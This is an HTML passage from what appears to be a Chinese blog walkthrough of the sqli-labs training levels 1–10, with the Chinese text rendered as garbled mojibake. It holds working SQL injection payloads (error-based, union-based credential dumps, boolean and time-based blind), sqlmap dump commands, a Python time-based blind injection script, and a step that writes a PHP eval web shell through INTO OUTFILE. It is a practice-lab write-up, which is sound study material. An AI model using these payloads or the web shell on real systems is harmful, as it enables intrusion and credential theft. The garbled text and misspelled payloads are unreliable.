â€™</p><p><strong>æ–¹æ³•äºŒï¼šæ‰‹åŠ¨æŠ¥é”™æ³¨å…¥</strong></p><p>é€šè¿‡æŠ¥é”™å›æ˜¾æŸ¥è¯¢ä¿¡æ¯</p><p>1ï¼Œçˆ†æ•°æ®åº“åï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; and extractvalue(1,concat(0x7e,(database()))) --+</span><br></pre></td></tr></table></figure><p>2,çˆ†è¡¨ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))) --+</span><br></pre></td></tr></table></figure><p>3ï¼Œ4ï¼Œç›´æ¥å°† <strong>extractvalue(1,concat(0x7e,(â€¦â€¦) ) )</strong>  å†…çš„å†…å®¹ä¿®æ”¹å³å¯ã€‚æˆ–è€…ç”¨ <strong>updatexmlï¼ˆ1ï¼Œconcat(0x7e,(â€¦â€¦),1ï¼‰</strong></p><p><img src="/2020/12/09/sql/1-10/%E6%8D%95%E8%8E%B7.PNG"></p><h4 id="Less-2ï¼š-GETå‹æ•´å‹æ³¨å…¥ï¼‰"><a href="#Less-2ï¼š-GETå‹æ•´å‹æ³¨å…¥ï¼‰" class="headerlink" title="Less 2ï¼š(GETå‹æ•´å‹æ³¨å…¥ï¼‰"></a>Less 2ï¼š(GETå‹æ•´å‹æ³¨å…¥ï¼‰</h4><p> ä»Šå¤©æˆåŠŸå®‰è£…äº†hackbarçš„æ—§ç‰ˆæœ¬</p><p> é“¾æ¥åœ°å€ä¸ºï¼š<a href="https://github.com/HCTYMFF/hackbar2.1.3">https://github.com/HCTYMFF/hackbar2.1.3</a> ï¼ˆåœ¨ç«ç‹æµè§ˆå™¨ä¸Šä½¿ç”¨ï¼‰</p><p> å…ˆé‡‡ç”¨</p><p>?id=1 union select 1,2,3â€“+  å‘ç°å¯è¡Œ</p><p>ä¸ä¹‹å‰ä¸€æ ·ï¼Œåˆåœ¨1ååŠ å…¥äº†åˆ†å·ï¼Œå‡ºç°è¯­æ³•æŠ¥é”™</p><p>åˆ æ‰åˆ†å·ï¼Œæˆ‘ä»¬ä¿®æ”¹è¯­å¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 union select group(schema_name)from information_schema.schemata--+</span><br></pre></td></tr></table></figure><p>æŸ¥åˆ°å…³äºæ•°æ®åº“å†…éƒ¨æ•°æ®</p><p>æ¥ç€ä¿®æ”¹</p><p>?id=1 union select group(schema_name)from information_schema.tables where table_schema=â€™securityâ€™â€“+</p><p>è¿™é‡Œå»ºè®®å°†securityä¿®æ”¹ä¸º16è¿›åˆ¶ï¼Œ0xå¼€å¤´ï¼Œè‹±æ–‡å•è¯ç”¨hackbaré‡Œçš„å·¥å…·è½¬æ¢ä¸º16è¿›åˆ¶æ•°</p><p>ä¹‹åä¿®æ”¹ä¸ºusername</p><p>å¾—åˆ°usernameå’Œpasswordå­—å</p><p>ç„¶ååŒç¬¬ä¸€å…³ä¸€æ ·ï¼Œæˆ‘ä»¬éœ€è¦è®©å®ƒå‡ºç°æ‰€æœ‰çš„æ•°æ®</p><p>æ…¢æ…¢æ¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 union select 1,2,contact_ws(,~username,password)from securiy.uesers--+</span><br></pre></td></tr></table></figure><p>åŒæ ·è¿™é‡Œçš„~ä½¿ç”¨åå…­è¿›åˆ¶ï¼Œä¿®æ”¹ä¸º0x7e</p><p>æˆ‘ä»¬å†åŠ group_concat å‡½æ•°å¾—åˆ°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1221 union select 1,2,gruop_concat(concat_ws(0x7e,username,password)from security.users--+</span><br></pre></td></tr></table></figure><p>tip:è¿™è¾¹åŠ è´Ÿå·æ˜¯ä½¿å¾—id=1å¤±å»ä½œç”¨ã€‚</p><p>æœ€åå›æ˜¾æ•°æ®ï¼Œå¾—åˆ°é“¾æ¥ä¸ºï¼š<a href="http://localhost/Less-2/?id=-1221">http://localhost/Less-2/?id=-1221</a> union select 1,2,group_concat(concat_ws(0x7e,username,password))from security.usersâ€“+<img src="/2020/12/09/sql/1-10/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(11).png"></p><h4 id="Less-3-åŸºäºé”™è¯¯çš„getå•å¼•å·å˜å½¢å­—ç¬¦æ³¨å…¥"><a href="#Less-3-åŸºäºé”™è¯¯çš„getå•å¼•å·å˜å½¢å­—ç¬¦æ³¨å…¥" class="headerlink" title="Less-3 (åŸºäºé”™è¯¯çš„getå•å¼•å·å˜å½¢å­—ç¬¦æ³¨å…¥)"></a>Less-3 (åŸºäºé”™è¯¯çš„getå•å¼•å·å˜å½¢å­—ç¬¦æ³¨å…¥)</h4><p>1ï¼Œè¾“å…¥ id=1 æ­£å¸¸ï¼Œè¾“å…¥id=1â€™ # å›æ˜¾é”™è¯¯ ï¼Œæ ¹æ®æŠ¥é”™ä¿¡æ¯ç¡®å®šå’±ä»¬è¾“å…¥çš„å†…å®¹å­˜æ”¾åˆ°ä¸€å¯¹å•å¼•å·åŠ åœ†æ‹¬å·ä¸­äº†ï¼ŒçŒœæƒ³ä¸€ä¸‹å’±ä»¬è¾“å…¥1åœ¨æ•°æ®åº“è¯­å¥ä¸­çš„ä½ç½®ï¼Œå½¢å¦‚select â€¦ from â€¦ where id=(â€˜1â€™) â€¦ï¼Œåœ¨ç¬¬ä¸€é¢˜ä¸­id=1â€˜çš„åé¢å•å¼•å·åŠ ä¸Šï¼‰ï¼Œå…¶å®ƒä¿æŒä¸å˜å°±è¡Œäº†</p><h4 id="Less-4-åŸºäºé”™è¯¯çš„getåŒå¼•å·å­—ç¬¦å‹æ³¨å…¥"><a href="#Less-4-åŸºäºé”™è¯¯çš„getåŒå¼•å·å­—ç¬¦å‹æ³¨å…¥" class="headerlink" title="Less-4 (åŸºäºé”™è¯¯çš„getåŒå¼•å·å­—ç¬¦å‹æ³¨å…¥)"></a>Less-4 (åŸºäºé”™è¯¯çš„getåŒå¼•å·å­—ç¬¦å‹æ³¨å…¥)</h4><p>,è¾“å…¥ id =1 å›æ˜¾æ­£å¸¸  è¾“å…¥ id =1â€™ å›æ˜¾æ­£å¸¸  è¾“å…¥ id = 1â€ å›æ˜¾é”™è¯¯  è¯´æ˜æ˜¯ åŒå¼•å·é—­åˆå‹</p><p>è¾“å…¥ id = 1â€ %23 å›æ˜¾é”™è¯¯  è¯´æ˜è¿˜æœ‰ä¸€ä¸ª å•æ‹¬å·é—­åˆ </p><p>è¾“å…¥ id = 1â€) â€¦â€¦ å…¶ä»–ä¸å˜</p><h4 id="Less-5-åŒæ³¨å…¥getå•å¼•å·å­—ç¬¦å‹æ³¨å…¥"><a href="#Less-5-åŒæ³¨å…¥getå•å¼•å·å­—ç¬¦å‹æ³¨å…¥" class="headerlink" title="Less-5(åŒæ³¨å…¥getå•å¼•å·å­—ç¬¦å‹æ³¨å…¥)"></a>Less-5(åŒæ³¨å…¥getå•å¼•å·å­—ç¬¦å‹æ³¨å…¥)</h4><p> ç¬¬äº”å…³ä¸å‰å››å…³ä¸åŒï¼Œæ²¡æœ‰äº†æ˜æ˜¾çš„å›æ˜¾ï¼Œç»è¿‡èµ„æ–™æŸ¥è¯¢ä¸ºå¸ƒå°”ç›²æ³¨ï¼ˆboolï¼‰</p><p>ä¸ä¹‹å‰ä¸€æ ·æˆ‘ä»¬å…ˆåˆ©ç”¨åŸºæœ¬è¯­å¥ï¼Œå‘ç°id=1â€™æ—¶æŠ¥é”™ï¼Œå­˜åœ¨æ³¨å…¥ï¼›</p><p>ä¹‹åç”¨order byè¯­å¥æŸ¥è¯¢åˆ°è‡³å¤šåªæœ‰3è¡Œï¼›</p><p>ä½†æ˜¯æ²¡æœ‰äº†æ˜æ˜¾çš„å›æ˜¾åï¼Œæˆ‘ä»¬ä¸èƒ½å†ä½¿ç”¨union select è”åˆæŸ¥è¯¢æ¥å¯»æ‰¾æˆ‘ä»¬è¦çš„æ•°æ®ï¼›</p><p>è¿™ä¸ªæ—¶å€™å°±ä½¿ç”¨æ–°çš„è¯­å¥ and left(( select database()),1) è¿›è¡Œè¯•æ¢ï¼Œæˆ–æ˜¯ç›´æ¥è¿›å…¥MySQLæ§åˆ¶å°ä½¿ç”¨è¯­å¥è¿›è¡ŒæŸ¥è¯¢æ›´åŠ ç›´è§‚</p><p>è¿™æ˜¯ç”¨sqlmapè·‘çš„æ•°æ®å›¾</p><p><img src="/2020/12/09/sql/1-10/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(12).png"></p><p>æœ€åçš„æ•°æ®ä¸ºâ€˜securityâ€™   </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;Less-5&#x2F;?id&#x3D;1%27%20and%20left%20((select%20database()),8)&#x3D;%27security%27--+</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ¨èå‡½æ•°é“¾æ¥ï¼šï¼š<a href="https://blog.csdn.net/qq_43573676/article/details/105774162">https://blog.csdn.net/qq_43573676/article/details/105774162</a></p><h4 id="Less-6-åŒæ³¨å…¥getåŒå¼•å·å­—ç¬¦å‹æ³¨å…¥"><a href="#Less-6-åŒæ³¨å…¥getåŒå¼•å·å­—ç¬¦å‹æ³¨å…¥" class="headerlink" title="Less-6 (åŒæ³¨å…¥getåŒå¼•å·å­—ç¬¦å‹æ³¨å…¥)"></a>Less-6 (åŒæ³¨å…¥getåŒå¼•å·å­—ç¬¦å‹æ³¨å…¥)</h4><p>åªç”¨å°†less 5 ä¸­çš„å•å¼•å·æ”¹ä¸º åŒå¼•å·å³å¯</p><h4 id="Less-7-å¯¼å‡ºæ–‡ä»¶getå­—ç¬¦å‹æ³¨å…¥"><a href="#Less-7-å¯¼å‡ºæ–‡ä»¶getå­—ç¬¦å‹æ³¨å…¥" class="headerlink" title="Less-7 (å¯¼å‡ºæ–‡ä»¶getå­—ç¬¦å‹æ³¨å…¥)"></a>Less-7 (å¯¼å‡ºæ–‡ä»¶getå­—ç¬¦å‹æ³¨å…¥)</h4><p>1ï¼Œè¡¥å……ï¼š<br>@@basedir ï¼šmysqlå®‰è£…è·¯å¾„</p><p>@@datadir ï¼šæ•°æ®åº“è·¯å¾„</p><p><strong>load_file(file_name)ï¼šè¯»å–æ–‡ä»¶å¹¶è¿”å›è¯¥æ–‡ä»¶çš„å†…å®¹ä½œä¸ºä¸€ä¸ªå­—ç¬¦ä¸²</strong></p><p><strong>ä½¿ç”¨æ¡ä»¶ï¼šå¿…é¡»æœ‰æƒé™è¯»å–å¹¶ä¸”æ–‡ä»¶å¯è¯»ï¼Œå¿…é¡»æŒ‡å®šæ–‡ä»¶å®Œæ•´çš„è·¯å¾„</strong></p><p>2ï¼Œç”±äºæˆ‘ä¸æ˜¯åœ¨æœ¬åœ°æ­è½½çš„ç¯å¢ƒï¼Œæ‰€ä»¥çŸ¥é“å…·ä½“çš„æ•°æ®å­˜æ”¾è·¯å¾„ï¼Œéœ€è¦å»è·å–ç»å¯¹è·¯å¾„ï¼Œ</p><p>å‰é¢çŸ¥é“ æœ¬é¢˜æ˜¯ å•å¼•å· åŠ åŒæ‹¬å· çš„é—­åˆæ–¹å¼ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? id&#x3D;-1&#39;)) union select 1,2,@@datadir --+</span><br></pre></td></tr></table></figure><p>è·å–ä¸äº† è·¯å¾„</p><p>äºæ˜¯å»å‰é¢çš„ç®€å•çš„é¢˜æ‰¾ä¸ªè·¯å¾„ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less-2&#x2F;?id&#x3D;-1 union select 1,@@basedir,@@datadir --+</span><br></pre></td></tr></table></figure><p>å¾—åˆ°è·¯ç»ï¼š<img src="https://img-blog.csdnimg.cn/20190511131738156.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70" alt="img"></p><p>è¿›è¡Œæ–‡ä»¶å¯¼å…¥ï¼š(è¿™é‡Œè¦ç”¨ \ ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;)) union select 1,2,&#39;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#39; into outfile &quot;http:&#x2F;&#x2F;43.247.91.228:84\\var\\lib\\mysql\\www\\123.php&quot;--+</span><br></pre></td></tr></table></figure><p><strong>éœ€è¦æ³¨æ„çš„æ˜¯ï¼šåˆ©ç”¨æ•°æ®åº“fileæƒé™å‘æ“ä½œç³»ç»Ÿå†™å…¥æ–‡ä»¶æ—¶ï¼Œ å¯¹äºç›¸åŒæ–‡ä»¶åçš„æ–‡ä»¶ä¸èƒ½è¦†ç›–ï¼Œæ‰€ä»¥å¦‚æœç¬¬ä¸€æ¬¡ä¸Šä¼ chao.phpï¼Œä¸‹æ¬¡åœ¨ä¸Šä¼ chao.phpï¼Œå°±æ˜¯æ— æ•ˆå‘½ä»¤äº†ï¼Œä¹Ÿå°±æ˜¯æ–°çš„chao,phpä¸­çš„å†…å®¹å¹¶ä¸ä¼šè¦†ç›–ï¼Œä¹‹å‰çš„chao.php</strong></p><p>ç„¶åç”¨èœåˆ€è¿›è¡Œè¿æ¥</p><p> æˆ‘è‡ªå·±åœ¨å°è¯•ç¬¬ä¸ƒå…³çš„æ—¶å€™ï¼Œå‘ç”Ÿäº†å¾ˆå¤šæ¬¡å¤±è´¥ï¼Œå¯¼è‡´sqlé¶åœºä¸€åº¦ææµ…</p><p>ç°åœ¨æƒ³æƒ³é”™è¯¯åº”è¯¥æ˜¯è¿™å‡ ä¸ªï¼š</p><p>1.æ²¡æœ‰//ï¼Œå› ä¸ºé‡åˆ°è½¬ä¹‰æ—¶éœ€ç”¨//æ‰èƒ½ä½¿å¾—æµè§ˆå™¨è§£ææ—¶ä¸ºæˆ‘ä»¬è‡ªå·±æƒ³è¦çš„ã€‚</p><p>2.æ ¼å¼æ²¡æœ‰å®Œå…¨å¯¹ï¼Œä¹‹å‰å€Ÿé‰´çš„åšå®¢é‡Œå¯èƒ½æœ‰ä¸€äº›é—®é¢˜ï¼ˆæ— æ„å†’çŠ¯ä¸€äº›å¤§ä½¬ï¼‰ã€‚</p><p>3.å¯¹äºä»€ä¹ˆæ˜¯ä¸€å¥è¯æœ¨é©¬æ²¡æœ‰ä¸€ç‚¹äº†è§£ï¼Œå°±è¿å·¥å…·antswordä¹Ÿæ˜¯è£…äº†å¾ˆä¹…æ‰æˆåŠŸã€‚</p><h4 id="Less-8-å¸ƒå°”å‹å•å¼•å·GETç›²æ³¨"><a href="#Less-8-å¸ƒå°”å‹å•å¼•å·GETç›²æ³¨" class="headerlink" title="Less-8 (å¸ƒå°”å‹å•å¼•å·GETç›²æ³¨)"></a>Less-8 (å¸ƒå°”å‹å•å¼•å·GETç›²æ³¨)</h4><p>1ï¼Œè¡¥å……ï¼š</p><p><strong>ï¼ˆ1ï¼‰ç›²æ³¨åˆ†ä¸ºä¸¤ç±»ï¼š<br>ã€€ã€€ã€€ã€€1.å¸ƒå°”ç›²æ³¨ã€€å¸ƒå°”å¾ˆæ˜æ˜¾Tureè·ŸFalesï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒåªä¼šæ ¹æ®ã€€ä½ çš„æ³¨å…¥ä¿¡æ¯è¿”å›Tureè·ŸFalesï¼Œä¹Ÿå°±æ²¡æœ‰äº†ä¹‹å‰çš„æŠ¥é”™ä¿¡æ¯ã€‚<br>ã€€ã€€ã€€ã€€2.æ—¶é—´ç›²æ³¨ã€€ç•Œé¢è¿”å›å€¼åªæœ‰ä¸€ç§,true æ— è®ºè¾“å…¥ä»»ä½•å€¼ è¿”å›æƒ…å†µéƒ½ä¼šæŒ‰æ­£å¸¸çš„æ¥å¤„ç†ã€‚åŠ å…¥ç‰¹å®šçš„æ—¶é—´å‡½æ•°ï¼Œé€šè¿‡æŸ¥çœ‹webé¡µé¢è¿”å›çš„æ—¶é—´å·®æ¥åˆ¤æ–­æ³¨å…¥çš„è¯­å¥æ˜¯å¦æ­£ç¡®ã€‚</strong></p><p>ï¼ˆ2ï¼‰</p><p>â€“batch ï¼š è®©sqlmapè‡ªåŠ¨è¾“å…¥</p><p>â€“dbms mysql   ï¼šæŒ‡å®šæ•°æ®åº“ç³»ç»Ÿä¸ºmysqlç»•è¿‡sqlmapçš„è‡ªåŠ¨æ£€æµ‹</p><p>-v æ˜¾ç¤º ç­‰çº§ï¼ˆ0-6ï¼‰</p><p><strong>æ–¹æ³•ä¸€ ï¼šç”¨sqlmap æŒ‰éƒ¨å°±ç­çš„</strong> æ¥ï¼Œæœ€åä¸€æ­¥çš„payload ä¸ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;43.247.91.228:84&#x2F;Less-8&#x2F;?id&#x3D;2&quot; --dbms mysql --batch -v 1 --dump -D security -T users -C &quot;id,password,username&quot;</span><br></pre></td></tr></table></figure><p><strong>æ–¹æ³•äºŒï¼š ç”¨è„šæœ¬è¿›è¡Œ ç›²æ³¨</strong> </p><p>å…·ä½“æ“ä½œ å‚è€ƒ <a href="https://blog.csdn.net/wy_97/article/details/78169623">https://blog.csdn.net/wy_97/article/details/78169623</a> çš„è¯¦ç»†æ“ä½œ</p><p><strong>æ–¹æ³•ä¸‰ï¼š å®Œå…¨å¯ä»¥æŒ‰ç…§ä¹‹å‰æ–¹æ³•æ…¢æ…¢æ¥çˆ†ç ´</strong></p><h4 id="Less-9-åŸºäºæ—¶é—´çš„GETå•å¼•å·ç›²æ³¨"><a href="#Less-9-åŸºäºæ—¶é—´çš„GETå•å¼•å·ç›²æ³¨" class="headerlink" title="Less-9 (åŸºäºæ—¶é—´çš„GETå•å¼•å·ç›²æ³¨)"></a>Less-9 (åŸºäºæ—¶é—´çš„GETå•å¼•å·ç›²æ³¨)</h4><p>1ï¼Œ<strong>è¡¥å……ï¼šæ—¶é—´ç›²æ³¨ã€€ç•Œé¢è¿”å›å€¼åªæœ‰ä¸€ç§,true æ— è®ºè¾“å…¥ä»»ä½•å€¼ è¿”å›æƒ…å†µéƒ½ä¼šæŒ‰æ­£å¸¸çš„æ¥å¤„ç†ã€‚åŠ å…¥ç‰¹å®šçš„æ—¶é—´å‡½æ•°ï¼Œé€šè¿‡æŸ¥çœ‹webé¡µé¢è¿”å›çš„æ—¶é—´å·®æ¥åˆ¤æ–­æ³¨å…¥çš„è¯­å¥æ˜¯å¦æ­£ç¡®ã€‚</strong></p><p>2ï¼Œæ‰‹å·¥æ³¨å…¥å®åœ¨æ˜¯å¤ªéº»çƒ¦ï¼Œå°†æ‰‹å·¥æ³¨å…¥æ•´ç†ä¸€ä¸‹å†™å‡ºä¸€ä¸ªè„šæœ¬ è®©æœºå™¨å»æ³¨å…¥</p><p>ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">value =<span class="string">&quot;abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@_.-&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://43.247.91.228:84/Less-9/?id=1&#x27; and if((ascii(substr((&#123;0&#125; limit 3,1),&#123;1&#125;,1)) = &#x27;&#123;2&#125;&#x27;),sleep(3),NULL); %23&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url_length=<span class="string">&quot;http://43.247.91.228:84/Less-9/?id=1&#x27; and if((length((&#123;0&#125; limit 3,1))=&#123;1&#125; ),sleep(3),NULL); %23&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_length</span>(<span class="params">payload</span>):</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        url= url_length.format(payload,n)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        print(url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(get_respone(url)):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            print(<span class="string">&quot;[+] length is &#123;0&#125;&quot;</span>.format(n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span>(<span class="params">payload,value,length</span>):</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">1</span>,length):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> v <span class="keyword">in</span> value :</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            url_data = url.format(payload,n,ord(v))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            print(url_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(get_respone(url_data)):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="keyword">global</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                data=data+v</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                print(<span class="string">&quot;[+] data is &#123;0&#125;&quot;</span>.format(data))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_respone</span>(<span class="params">url</span>):</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        html = requests.get(url,timeout=<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        print(<span class="string">&quot;......&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">databse_payload =<span class="string">&quot;select  table_name from information_schema.tables where table_schema = database()&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">get_data(databse_payload,value,get_length(databse_payload)+<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><strong>è¿™ä¸ªè„šæœ¬ä½ æ¯æ¬¡åªèƒ½æŸ¥è¯¢ ä¸€ä¸ªå†…å®¹ï¼Œ</strong></p><p><strong>éœ€è¦ä¸æ–­æ”¹å˜ 4ï¼Œ5ï¼Œè¡Œä¸­ limit xï¼Œ1 çš„ x çš„æ•°å­—å»æŸ¥è¯¢ï¼Œ</strong></p><p><strong>ä¹Ÿéœ€è¦æ”¹å˜ database_payload å»æŸ¥è¯¢ä¸åŒçš„ä¿¡æ¯</strong></p><h4 id="Less-10-åŸºäºæ—¶é—´çš„åŒå¼•å·ç›²æ³¨"><a href="#Less-10-åŸºäºæ—¶é—´çš„åŒå¼•å·ç›²æ³¨" class="headerlink" title="Less-10 (åŸºäºæ—¶é—´çš„åŒå¼•å·ç›²æ³¨)"></a>Less-10 (åŸºäºæ—¶é—´çš„åŒå¼•å·ç›²æ³¨)</h4><p>1ï¼Œåªç”¨å°†ç¬¬9é¢˜ä¸­çš„å•å¼•å·æ”¹ä¸ºåŒå¼•å·ï¼Œå…¶ä»–ç”¨è„šæœ¬æ³¨å…¥å°±å¥½</p><p><strong>æ³¨æ„ï¼Œåœ¨è„šæœ¬çš„ç¬¬ 4ï¼Œ5ä¸­çš„æ‰€æœ‰çš„å•å¼•å·éƒ½æ”¹ä¸ºåŒå¼•å·</strong></p><h1 id><a href="#" class="headerlink" title></a></h1><h1 id="sqlmap-postç±»å‹æ³¨å…¥æ–¹æ³•ï¼š"><a href="#sqlmap-postç±»å‹æ³¨å…¥æ–¹æ³•ï¼š" class="headerlink" title="sqlmap postç±»å‹æ³¨å…¥æ–¹æ³•ï¼š"></a>sqlmap postç±»å‹æ³¨å…¥æ–¹æ³•ï¼š</h1><p><strong><em>\</em>æ–¹æ³•ä¸€ï¼šï¼ˆâ€œ-r txt â€æ–¹å¼æ³¨å…¥ï¼‰**</strong></p><p>1ï¼Œå…ˆç”¨burp suite æŠ“åŒ…ï¼Œä¿å­˜ä¸º1.txtæ–‡ä»¶æ”¾åœ¨æ¡Œé¢ä¸Š</p><p><img src="https://img-blog.csdnimg.cn/20190523221451758.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70" alt="img"></p><p>2ï¼Œæ‰“å¼€sqlmap</p><p>æŸ¥è¯¢æ•°æ®åº“åï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r &quot;c:\Users\HP\Desktop\1.txt&quot; -p id --dbs</span><br></pre></td></tr></table></figure><p>æ³¨ï¼š-rè¡¨ç¤ºåŠ è½½ä¸€ä¸ªæ–‡ä»¶ï¼Œ-pæŒ‡å®šå‚æ•°</p><p>ä¹‹åå¯¹åº”é€‰æ‹©è¾“å…¥ ï¼š Y    N     Y</p><p>å¾—åˆ°ï¼š<img 